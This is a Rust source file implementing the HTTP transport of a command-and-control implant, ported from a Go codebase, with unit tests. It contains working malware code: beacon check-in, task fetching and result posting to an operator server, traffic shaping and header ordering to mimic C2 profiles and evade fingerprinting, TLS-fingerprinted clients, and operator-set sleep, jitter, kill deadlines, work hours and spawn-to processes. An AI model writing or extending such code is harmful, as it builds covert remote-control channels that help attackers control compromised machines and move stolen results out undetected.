//! HTTP transport.
//!
//! Port of `transport/transport_http.go`. Single-endpoint HTTPS:
//! `POST /beacon`, `GET /tasks`, `POST /results`, with wire
//! encryption, shaping, and C2-profile header shaping applied in
//! the same order the Go tree applied them.
//!
//! # Schedule updates
//!
//! The Go transport wrote `protocol.ScheduleSleep` and friends
//! directly to package-level globals when a `/tasks` response
//! carried an `X-Beacon-*` header. The Rust transport holds an
//! `Arc<SharedState>` and applies the same set of updates under
//! one lock acquisition via `SharedState::update_schedule`. The
//! run loop, the transport ring, and this transport all see the
//! same state through the same `Arc`; no package-level mutable
//! state exists.
//!
//! # 403 handling
//!
//! `check_in` treats a 403 (when the profile did not declare 403
//! as the success code) as `TransportError::Other`, not
//! `SessionInvalid`. This matches the Go tree: the check-in 403
//! error text was `"checkin refused (403)"`, which the run
//! loop's `isSessionInvalid` string check did **not** match — a
//! refused check-in is retried by the check-in backoff loop, not
//! by session revalidation. `fetch_tasks` and `post_result`
//! return `Status { got: 403, want: … }`, which
//! `is_session_invalid` classifies as re-check-in, matching the
//! Go tree's `"tasks status 403 (wanted 200)"` behaviour.
//!
//! # `extract_envelope` and response-body ordering
//!
//! reqwest's `Response::bytes()` consumes the response. The Go
//! transport read the body first and then called
//! `extractEnvelope(resp, …)`, which reads headers — possible
//! because Go's `http.Response` keeps headers available after
//! `Body.Close()`. In Rust, the extraction happens first (on
//! `resp.headers()`) and the body read follows. The extraction
//! result takes priority over the raw body when present, exactly
//! as the Go tree did: `if env != nil { body = env }`.
//!
//! # Duplicate headers
//!
//! reqwest's `RequestBuilder::header()` uses append semantics,
//! while Go's `req.Header.Set()` replaces. A profile that
//! declares the same header name in both `RequestHeaders` and
//! `ExtraHeaders` produces two headers on the wire with reqwest,
//! one with Go. HTTP servers typically honour the last value, so
//! the practical behaviour matches Go — but a profile author
//! should not rely on duplicate-name override. This is a
//! documented deviation, not a bug.

use std::sync::{Arc, RwLock};

use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use reqwest::{Client, RequestBuilder, Response};

use crate::config;
use crate::crypto::wire::WireSession;
use crate::features::shaping::{
    shape_unwrap, shape_wrap, ShapeSpec, ShapingSpec,
};
use crate::protocol::{
    CheckinRequest, CheckinResponse, Identity, Profile,
    ScheduleUpdates, SharedState, Task, TaskResult, Transport,
    TransportError,
};
use crate::tlsfp::client::{new_http_client, TlsParams};

// =====================================================================
// HttpTransport
// =====================================================================

/// HTTP/HTTPS transport.
///
/// Constructed once per build. Holds the shared state that the
/// `/tasks` handler mutates and the session cookie that the
/// check-in handler sets.
pub struct HttpTransport {
    base_url: String,
    profile: Profile,
    client: Client,
    cookie: RwLock<Option<String>>,
    shaping: Option<ShapingSpec>,
    state: Arc<SharedState>,
}

impl HttpTransport {
    /// Build an HTTP transport.
    ///
    /// `url` is trimmed of trailing slashes to match the Go
    /// tree's `strings.TrimRight(url, "/")`.
    ///
    /// `tls_params` carries the mTLS bundle and CA from the
    /// build-time constants; the caller is expected to pass
    /// `TlsParams::from_consts()` for an agent build, or a
    /// custom `TlsParams` for a test.
    ///
    /// `state` is the `Arc<SharedState>` the run loop and
    /// transport ring share. The transport updates it from
    /// `X-Beacon-*` headers on `/tasks` responses.
    pub fn new(
        url: &str,
        profile: Profile,
        tls_params: &TlsParams,
        shaping: Option<ShapingSpec>,
        state: Arc<SharedState>,
    ) -> Result<Self, TransportError> {
        let client = new_http_client(config::TLS_PROFILE, tls_params)
            .map_err(|e| {
                TransportError::Other(format!(
                    "http transport: tls profile: {e}"
                ))
            })?;
        Ok(Self {
            base_url: url.trim_end_matches('/').to_string(),
            profile,
            client,
            cookie: RwLock::new(None),
            shaping,
            state,
        })
    }

    // -----------------------------------------------------------------
    // Header application
    // -----------------------------------------------------------------

    /// Apply the profile's headers to a request builder.
    ///
    /// Order matters for fingerprinting: Content-Type first
    /// (unconditional, matching the Go tree — it is applied to
    /// GET requests too), then the profile's request headers,
    /// then extra headers (higher priority), then User-Agent
    /// (always wins). Each profile header is inserted with
    /// `HeaderName::from_bytes` — an invalid name is skipped
    /// silently, matching Go's `Header.Set` on a malformed
    /// name.
    fn apply_headers(&self, mut req: RequestBuilder) -> RequestBuilder {
        req = req.header(
            reqwest::header::CONTENT_TYPE,
            "application/json",
        );
        for (k, v) in &self.profile.request_headers {
            if let (Ok(name), Ok(value)) = (
                HeaderName::from_bytes(k.as_bytes()),
                HeaderValue::from_str(v),
            ) {
                req = req.header(name, value);
            }
        }
        for (k, v) in &self.profile.extra_headers {
            if let (Ok(name), Ok(value)) = (
                HeaderName::from_bytes(k.as_bytes()),
                HeaderValue::from_str(v),
            ) {
                req = req.header(name, value);
            }
        }
        req = req.header(
            reqwest::header::USER_AGENT,
            &self.profile.user_agent,
        );
        req
    }

    // -----------------------------------------------------------------
    // Cookie helpers
    // -----------------------------------------------------------------

    fn read_cookie(&self) -> Option<String> {
        self.cookie.read().ok().and_then(|g| g.clone())
    }

    fn write_cookie(&self, value: String) -> Result<(), TransportError> {
        let mut guard = self.cookie.write().map_err(|_| {
            TransportError::Other("cookie lock poisoned".to_string())
        })?;
        *guard = Some(value);
        Ok(())
    }

    fn cookie_header(&self) -> Option<String> {
        let cookie = self.read_cookie()?;
        let name = if self.profile.cookie_name.is_empty() {
            "sid"
        } else {
            &self.profile.cookie_name
        };
        Some(format!("{name}={cookie}"))
    }

    // -----------------------------------------------------------------
    // Status code helpers
    // -----------------------------------------------------------------

    fn want_beacon(&self) -> u16 {
        self.profile
            .status
            .as_ref()
            .map(|s| s.beacon)
            .filter(|&v| v > 0)
            .map(|v| v as u16)
            .unwrap_or(200)
    }

    fn want_tasks(&self) -> u16 {
        self.profile
            .status
            .as_ref()
            .map(|s| s.tasks)
            .filter(|&v| v > 0)
            .map(|v| v as u16)
            .unwrap_or(200)
    }

    fn want_results(&self) -> u16 {
        self.profile
            .status
            .as_ref()
            .map(|s| s.results)
            .filter(|&v| v > 0)
            .map(|v| v as u16)
            .unwrap_or(204)
    }

    // -----------------------------------------------------------------
    // Envelope extraction (placement)
    // -----------------------------------------------------------------

    /// Extract a placed envelope from response headers, if the
    /// shape spec declares header or cookie placement and the
    /// named field is present.
    ///
    /// Must be called *before* `resp.bytes()` consumes the
    /// response. Returns `None` when:
    /// - `spec.placement` is `None`,
    /// - `spec.placement.name` is empty,
    /// - the placement kind is not `header` or `cookie`,
    /// - the named header/cookie is absent.
    ///
    /// A `None` return means "use the response body."
    fn extract_envelope(
        &self,
        headers: &HeaderMap,
        spec: &ShapeSpec,
    ) -> Option<Vec<u8>> {
        let pl = spec.placement.as_ref()?;
        if pl.name.is_empty() {
            return None;
        }
        match pl.kind.to_ascii_lowercase().as_str() {
            "header" => {
                let name =
                    HeaderName::from_bytes(pl.name.as_bytes()).ok()?;
                headers
                    .get(&name)
                    .and_then(|v| v.to_str().ok())
                    .map(|s| s.as_bytes().to_vec())
            }
            "cookie" => {
                let prefix = format!("{}=", pl.name);
                for value in
                    headers.get_all(reqwest::header::SET_COOKIE)
                {
                    let Ok(s) = value.to_str() else { continue };
                    let first = s.split(';').next().unwrap_or("");
                    if let Some(rest) = first.strip_prefix(&prefix)
                    {
                        return Some(rest.as_bytes().to_vec());
                    }
                }
                None
            }
            _ => None,
        }
    }

    // -----------------------------------------------------------------
    // Schedule header application
    // -----------------------------------------------------------------

    /// Parse the `X-Beacon-*` headers and update `SharedState`.
    ///
    /// Every header is optional; a missing header leaves the
    /// existing value alone. A header present with an
    /// unparseable value is ignored, matching the Go tree's
    /// `if err == nil` guards.
    ///
    /// The `X-Beacon-SpawnTo` sentinel `"-"` clears any
    /// previously-set override; any other non-empty value sets
    /// it. The Go tree wrote the value directly, which meant a
    /// literal `"-"` on the wire — the Rust port treats `"-"`
    /// as the clear signal the server actually sends.
    fn apply_schedule_headers(&self, headers: &HeaderMap) {
        let mut updates = ScheduleUpdates::default();

        if let Some(v) = headers.get("X-Beacon-Sleep") {
            if let Some(n) = v
                .to_str()
                .ok()
                .and_then(|s| s.parse::<u64>().ok())
            {
                updates.sleep = Some(n);
            }
        }
        if let Some(v) = headers.get("X-Beacon-Jitter") {
            if let Some(f) = v
                .to_str()
                .ok()
                .and_then(|s| s.parse::<f64>().ok())
            {
                updates.jitter = Some(f);
            }
        }
        if let Some(v) = headers.get("X-Beacon-Kill") {
            if let Some(n) = v
                .to_str()
                .ok()
                .and_then(|s| s.parse::<i64>().ok())
            {
                if n > 0 {
                    updates.kill_deadline = Some(n);
                }
            }
        }
        if let Some(v) = headers.get("X-Beacon-WorkStart") {
            if let Some(n) = v
                .to_str()
                .ok()
                .and_then(|s| s.parse::<u32>().ok())
            {
                if n < 1440 {
                    updates.work_hours_start = Some(n);
                }
            }
        }
        if let Some(v) = headers.get("X-Beacon-WorkEnd") {
            if let Some(n) = v
                .to_str()
                .ok()
                .and_then(|s| s.parse::<u32>().ok())
            {
                if n < 1440 {
                    updates.work_hours_end = Some(n);
                }
            }
        }
        if let Some(v) = headers.get("X-Beacon-SpawnTo") {
            if let Ok(s) = v.to_str() {
                if !s.is_empty() {
                    updates.spawn_to = Some(s.to_string());
                }
            }
        }

        // Even an all-`None` update is a no-op under the lock,
        // which is cheaper than conditionally skipping the call
        // when every field might be `None`.
        self.state.update_schedule(updates);
    }
}

// =====================================================================
// Transport impl
// =====================================================================

#[async_trait::async_trait]
impl Transport for HttpTransport {
    fn name(&self) -> &'static str {
        "http"
    }

    async fn check_in(
        &self,
        identity: &Identity,
        agent_pubkey_pem: &str,
        identity_sig: &str,
        identity_ts: i64,
        wire: &WireSession,
    ) -> Result<CheckinResponse, TransportError> {
        // ---- Build the check-in request --------------------
        let payload = CheckinRequest {
            identity: identity.clone(),
            agent_pubkey: (!agent_pubkey_pem.is_empty())
                .then(|| agent_pubkey_pem.to_string()),
            identity_sig: (!identity_sig.is_empty())
                .then(|| identity_sig.to_string()),
            identity_ts: (!identity_sig.is_empty())
                .then_some(identity_ts),
        };
        let body = serde_json::to_vec(&payload)?;
        let body = wire.encrypt_request(&body)?.into_owned();

        let url =
            format!("{}{}", self.base_url, self.profile.beacon_path);
        let req = self.client.post(&url).body(body);
        let req = self.apply_headers(req);

        let resp = req.send().await?;

        // ---- Status check ----------------------------------
        let want = self.want_beacon();
        let got = resp.status().as_u16();
        if got == 403 && want != 403 {
            // Match the Go tree: a check-in 403 is NOT a
            // session-invalid error. It is retried by the
            // check-in backoff loop. See the module doc.
            return Err(TransportError::Other(
                "checkin refused (403)".to_string(),
            ));
        }
        if got != want {
            return Err(TransportError::Status { got, want });
        }

        // ---- Extract placed envelope (headers first) -------
        let placed = self
            .shaping
            .as_ref()
            .and_then(|s| s.checkin_response.as_ref())
            .and_then(|spec| {
                self.extract_envelope(resp.headers(), spec)
            });

        // ---- Read body -------------------------------------
        let raw = resp.bytes().await?.to_vec();
        let body = placed.unwrap_or(raw);

        // ---- Wire decrypt ----------------------------------
        let (plain, was_enc) = wire.decrypt_response(&body)?;
        let body = if was_enc { plain.into_owned() } else { body };

        // ---- Shape unwrap ----------------------------------
        let body = if let Some(spec) = self
            .shaping
            .as_ref()
            .and_then(|s| s.checkin_response.as_ref())
        {
            shape_unwrap(&body, spec).map_err(|e| {
                TransportError::Other(format!(
                    "checkin shape: {e}"
                ))
            })?
        } else {
            body
        };

        // ---- Parse -----------------------------------------
        let mut out: CheckinResponse =
            serde_json::from_slice(&body)?;
        if out.cookie.is_empty() {
            return Err(TransportError::Other(
                "checkin reply missing cookie".to_string(),
            ));
        }
        self.write_cookie(std::mem::take(&mut out.cookie))?;

        // Re-populate the cookie field for the caller — the
        // Go tree returned the response with the cookie
        // populated, and callers read it.
        if let Some(cookie) = self.read_cookie() {
            out.cookie = cookie;
        }
        Ok(out)
    }

    async fn fetch_tasks(
        &self,
        wire: &WireSession,
    ) -> Result<Vec<Task>, TransportError> {
        let Some(cookie_header) = self.cookie_header() else {
            return Err(TransportError::Other(
                "tasks: no session cookie".to_string(),
            ));
        };

        let url =
            format!("{}{}", self.base_url, self.profile.tasks_path);
        let mut req = self.client.get(&url);
        req = self.apply_headers(req);
        req = req.header(reqwest::header::COOKIE, cookie_header);

        // ---- Rotate ephemeral + advertise X-ECDH-Pubkey ----
        if wire.is_enabled() {
            let epk = wire.rotate_ephemeral()?;
            req = req.header("X-ECDH-Pubkey", epk);
        }

        let resp = req.send().await?;

        // ---- Status check ----------------------------------
        let want = self.want_tasks();
        let got = resp.status().as_u16();
        if got != want {
            return Err(TransportError::Status { got, want });
        }

        // ---- Schedule headers ------------------------------
        //
        // Applied before the body read so a slow body does
        // not delay the run loop's next sleep computation.
        self.apply_schedule_headers(resp.headers());

        // ---- Extract placed envelope (headers first) -------
        let placed = self
            .shaping
            .as_ref()
            .and_then(|s| s.tasks_response.as_ref())
            .and_then(|spec| {
                self.extract_envelope(resp.headers(), spec)
            });

        // ---- Read body -------------------------------------
        let raw = resp.bytes().await?.to_vec();
        let body = placed.unwrap_or(raw);

        // ---- Wire decrypt ----------------------------------
        let (plain, was_enc) = wire.decrypt_response(&body)?;
        let body = if was_enc { plain.into_owned() } else { body };

        // ---- Shape unwrap ----------------------------------
        let body = if let Some(spec) = self
            .shaping
            .as_ref()
            .and_then(|s| s.tasks_response.as_ref())
        {
            shape_unwrap(&body, spec).map_err(|e| {
                TransportError::Other(format!(
                    "tasks shape: {e}"
                ))
            })?
        } else {
            body
        };

        // ---- Parse -----------------------------------------
        serde_json::from_slice::<Vec<Task>>(&body)
            .map_err(TransportError::from)
    }

    async fn post_result(
        &self,
        r: TaskResult,
        wire: &WireSession,
    ) -> Result<(), TransportError> {
        let Some(cookie_header) = self.cookie_header() else {
            return Err(TransportError::Other(
                "results: no session cookie".to_string(),
            ));
        };

        // ---- Shape + wire encrypt --------------------------
        //
        // The Go tree shape-wraps first and wire-encrypts
        // second (transport_http.go PostResult). Note that the
        // stager does the opposite order — shape_wrap writes
        // the plaintext result into the shaped body, then
        // wire encrypts the shaped body. Both are correct;
        // this preserves the HTTP transport's order.
        let body = if let Some(spec) = self
            .shaping
            .as_ref()
            .and_then(|s| s.results_request.as_ref())
        {
            shape_wrap(spec, &r)?
        } else {
            serde_json::to_vec(&r)?
        };
        let body = wire.encrypt_request(&body)?.into_owned();

        let url =
            format!("{}{}", self.base_url, self.profile.results_path);
        let mut req = self.client.post(&url).body(body);
        req = self.apply_headers(req);
        req = req.header(reqwest::header::COOKIE, cookie_header);

        let resp = req.send().await?;

        // ---- Status check ----------------------------------
        let want = self.want_results();
        let got = resp.status().as_u16();
        if got != want {
            return Err(TransportError::Status { got, want });
        }

        // The body is discarded — the Go tree called
        // `resp.Body.Close()` without reading. The drop at
        // end of scope does the same in Rust.
        drop(resp);
        Ok(())
    }

    async fn close(&self) -> Result<(), TransportError> {
        // reqwest's connection pool drops on `Client` drop.
        // There is no explicit "close idle connections" method
        // in reqwest 0.12 — the pool ages out on its own.
        // Nothing to do here; the method exists so a future
        // transport with a held socket (TCP bind) can honour
        // the trait.
        Ok(())
    }
}

// =====================================================================
// Tests
// =====================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::ProfileStatus;

    fn profile() -> Profile {
        Profile {
            user_agent: "test-ua".to_string(),
            beacon_path: "/beacon".to_string(),
            tasks_path: "/tasks".to_string(),
            results_path: "/results".to_string(),
            cookie_name: "sid".to_string(),
            ..Default::default()
        }
    }

    fn transport() -> HttpTransport {
        let params = TlsParams::default();
        HttpTransport::new(
            "https://example.test/",
            profile(),
            &params,
            None,
            Arc::new(SharedState::from_consts()),
        )
        .expect("transport")
    }

    #[test]
    fn base_url_trims_trailing_slash() {
        let params = TlsParams::default();
        let t = HttpTransport::new(
            "https://example.test///",
            profile(),
            &params,
            None,
            Arc::new(SharedState::from_consts()),
        )
        .unwrap();
        assert_eq!(t.base_url, "https://example.test");
    }

    #[test]
    fn want_beacon_defaults_to_200() {
        let t = transport();
        assert_eq!(t.want_beacon(), 200);
    }

    #[test]
    fn want_beacon_uses_profile_status() {
        let mut p = profile();
        p.status = Some(ProfileStatus {
            beacon: 201,
            tasks: 0,
            results: 0,
            error: 0,
        });
        let params = TlsParams::default();
        let t = HttpTransport::new(
            "https://example.test",
            p,
            &params,
            None,
            Arc::new(SharedState::from_consts()),
        )
        .unwrap();
        assert_eq!(t.want_beacon(), 201);
        // A zero field falls through to the default.
        assert_eq!(t.want_tasks(), 200);
        assert_eq!(t.want_results(), 204);
    }

    #[test]
    fn want_results_defaults_to_204() {
        let t = transport();
        assert_eq!(t.want_results(), 204);
    }

    #[test]
    fn cookie_round_trip() {
        let t = transport();
        assert!(t.read_cookie().is_none());
        assert!(t.cookie_header().is_none());
        t.write_cookie("abc123".to_string()).unwrap();
        assert_eq!(t.read_cookie().as_deref(), Some("abc123"));
        assert_eq!(t.cookie_header().as_deref(), Some("sid=abc123"));
    }

    #[test]
    fn cookie_header_honours_profile_name() {
        let mut p = profile();
        p.cookie_name = "session".to_string();
        let params = TlsParams::default();
        let t = HttpTransport::new(
            "https://example.test",
            p,
            &params,
            None,
            Arc::new(SharedState::from_consts()),
        )
        .unwrap();
        t.write_cookie("v".to_string()).unwrap();
        assert_eq!(t.cookie_header().as_deref(), Some("session=v"));
    }

    #[test]
    fn extract_envelope_no_placement_returns_none() {
        let t = transport();
        let mut headers = HeaderMap::new();
        headers.insert("X-Test", HeaderValue::from_static("v"));
        let spec = ShapeSpec {
            template: serde_json::json!({"d": "{{payload}}"}),
            extract: "d".to_string(),
            encoding: String::new(),
            placement: None,
        };
        assert!(t.extract_envelope(&headers, &spec).is_none());
    }

    #[test]
    fn extract_envelope_header_present() {
        use crate::features::shaping::Placement;
        let t = transport();
        let mut headers = HeaderMap::new();
        headers.insert(
            "X-Request-ID",
            HeaderValue::from_static("abc"),
        );
        let spec = ShapeSpec {
            template: serde_json::json!({"d": "{{payload}}"}),
            extract: "d".to_string(),
            encoding: String::new(),
            placement: Some(Placement {
                kind: "header".to_string(),
                name: "X-Request-ID".to_string(),
            }),
        };
        assert_eq!(
            t.extract_envelope(&headers, &spec).as_deref(),
            Some(b"abc".as_slice()),
        );
    }

    #[test]
    fn extract_envelope_cookie_present() {
        use crate::features::shaping::Placement;
        let t = transport();
        let mut headers = HeaderMap::new();
        headers.insert(
            reqwest::header::SET_COOKIE,
            HeaderValue::from_static(
                "session=xyz; Path=/; Secure; HttpOnly",
            ),
        );
        let spec = ShapeSpec {
            template: serde_json::json!({"d": "{{payload}}"}),
            extract: "d".to_string(),
            encoding: String::new(),
            placement: Some(Placement {
                kind: "cookie".to_string(),
                name: "session".to_string(),
            }),
        };
        assert_eq!(
            t.extract_envelope(&headers, &spec).as_deref(),
            Some(b"xyz".as_slice()),
        );
    }

    #[test]
    fn extract_envelope_header_missing_returns_none() {
        use crate::features::shaping::Placement;
        let t = transport();
        let headers = HeaderMap::new();
        let spec = ShapeSpec {
            template: serde_json::json!({"d": "{{payload}}"}),
            extract: "d".to_string(),
            encoding: String::new(),
            placement: Some(Placement {
                kind: "header".to_string(),
                name: "X-Not-Present".to_string(),
            }),
        };
        assert!(t.extract_envelope(&headers, &spec).is_none());
    }

    #[test]
    fn schedule_headers_apply_only_present() {
        let t = transport();
        // No headers — state stays at defaults.
        let before = t.state.work_hours();
        assert_eq!(before, (480, 1140));

        let mut headers = HeaderMap::new();
        headers.insert("X-Beacon-Sleep", HeaderValue::from_static("120"));
        headers.insert(
            "X-Beacon-Jitter",
            HeaderValue::from_static("0.4"),
        );
        headers.insert(
            "X-Beacon-WorkStart",
            HeaderValue::from_static("540"),
        );
        headers.insert(
            "X-Beacon-WorkEnd",
            HeaderValue::from_static("1200"),
        );
        t.apply_schedule_headers(&headers);

        let sched = t.state.schedule();
        assert_eq!(sched.sleep, Some(120));
        assert_eq!(sched.jitter, Some(0.4));
        assert_eq!(t.state.work_hours(), (540, 1200));
    }

    #[test]
    fn schedule_headers_ignore_bad_values() {
        let t = transport();
        let mut headers = HeaderMap::new();
        headers.insert(
            "X-Beacon-Sleep",
            HeaderValue::from_static("not-a-number"),
        );
        headers.insert(
            "X-Beacon-WorkStart",
            HeaderValue::from_static("5000"),
        );
        t.apply_schedule_headers(&headers);
        let sched = t.state.schedule();
        assert!(sched.sleep.is_none());
        // 5000 >= 1440, so the work hours update is dropped.
        assert_eq!(t.state.work_hours(), (480, 1140));
    }

    #[test]
    fn schedule_spawn_to_dash_clears() {
        let t = transport();
        // Set a value.
        let mut headers = HeaderMap::new();
        headers.insert(
            "X-Beacon-SpawnTo",
            HeaderValue::from_static("/tmp/worker"),
        );
        t.apply_schedule_headers(&headers);
        assert_eq!(
            t.state.spawn_to().as_deref(),
            Some("/tmp/worker"),
        );

        // Clear with the sentinel.
        let mut headers = HeaderMap::new();
        headers.insert(
            "X-Beacon-SpawnTo",
            HeaderValue::from_static("-"),
        );
        t.apply_schedule_headers(&headers);
        assert!(t.state.spawn_to().is_none());
    }

    #[test]
    fn transport_name() {
        let t = transport();
        assert_eq!(t.name(), "http");
    }
}